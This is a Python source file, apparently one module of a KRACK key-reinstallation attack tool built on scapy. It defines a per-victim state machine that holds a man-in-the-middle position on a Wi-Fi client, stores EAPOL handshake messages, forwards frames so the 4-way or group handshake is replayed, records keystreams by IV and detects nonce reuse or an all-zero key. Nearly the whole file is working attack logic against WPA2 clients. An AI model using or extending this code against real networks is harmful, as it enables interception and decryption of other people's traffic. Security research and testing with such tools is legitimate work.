import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
from krackattack.helper import logging
from krackattack.helper import packetProcess

class ClientState():
	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()

	def reset(self):
		self.state = ClientState.Initializing
		self.keystreams = dict()
		self.attack_max_iv = None
		self.attack_time = None

		self.assocreq = None
		self.msg1 = None
		self.msg3s = []
		self.msg4 = None
		self.krack_finished = False

	def store_msg1(self, msg1):
		self.msg1 = msg1

	def add_if_new_msg3(self, msg3):
		if packetProcess.get_eapol_replaynum(msg3) in [packetProcess.get_eapol_replaynum(p) for p in self.msg3s]:
			return
		self.msg3s.append(msg3)


	def update_state(self, state):
		logging.log(logging.DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
		self.state = state

	def mark_got_mitm(self):
		if self.state <= ClientState.Connecting:
			self.state = ClientState.GotMitm
			logging.log(logging.STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
				color="green", showtime=False)

	def is_state(self, state):
		return self.state == state

	# TODO: Also forward when attack has failed?
	def should_forward(self, p):
		if logging.group:
			# Forwarding rules when attacking the group handshake
			return True

		else:
			# Forwarding rules when attacking the 4-way handshake
			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= packetProcess.get_eapol_msgnum(p) and packetProcess.get_eapol_msgnum(p) <= 3) \
					or (p.type == 0 and p.subtype == 13)
			return self.state in [ClientState.Success_Reinstalled]

	def save_iv_keystream(self, iv, keystream):
		self.keystreams[iv] = keystream

	def get_keystream(self, iv):
		return self.keystreams[iv]

	def attack_start(self):
		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
		self.attack_time = time.time()
		self.update_state(ClientState.Attack_Started)

	def is_iv_reused(self, iv):
		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams

	def attack_timeout(self, iv):
		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
